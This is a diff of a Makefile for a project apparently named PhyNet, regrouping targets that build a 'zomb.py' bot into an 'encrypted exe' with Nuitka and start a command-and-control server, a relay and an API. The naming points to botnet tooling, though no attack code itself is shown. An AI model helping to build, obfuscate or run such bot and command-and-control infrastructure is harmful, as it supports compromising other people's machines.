@@ -21,18 +21,34 @@ install:
 	@$(PY_EXE) -m pip install -r PhyNet/bot/requirements.txt
 	@$(PY_EXE) -m pip install -r PhyNet/server/requirements.txt
 
+# ======= BOT ===>
+
 # install locally the nuitka compiller (will be used to output an encrypted exe for bot)
 install-nuitka:
 	@$(PY_EXE) -m pip install nuitka
 
-# start the cnc
-cnc:
-	@$(PY_EXE) PhyNet/server/cnc/cnc.py $(CNC_PORT)
-
-# start the relay
-relay:
-	@$(PY_EXE) PhyNet/server/relay/relay.py $(RELAY_PORT)
-
 # build the bot
 build-bot: | install install-nuitka
 	$(PY_EXE) -m nuitka PhyNet/bot/zomb.py $(NUITKA_ARGS)
+
+bot:
+	@$(PY_EXE) PhyNet/bot/zomb.py
+
+# ======= CNC ===>
+
+cnc: # start the cnc locally
+	@$(PY_EXE) PhyNet/server/cnc/cnc.py $(CNC_PORT)
+
+# ======= RELAY ===>
+
+relay: # start the relay locally
+	@$(PY_EXE) PhyNet/server/relay/relay.py $(RELAY_PORT)
+
+# ======= API ===>
+
+build-api:
+	@$(MAKE) -C PhyNet/server/api/v3/ build
+
+api: build-api
+	@./PhyNet/server/api/v3/bin/v3
+
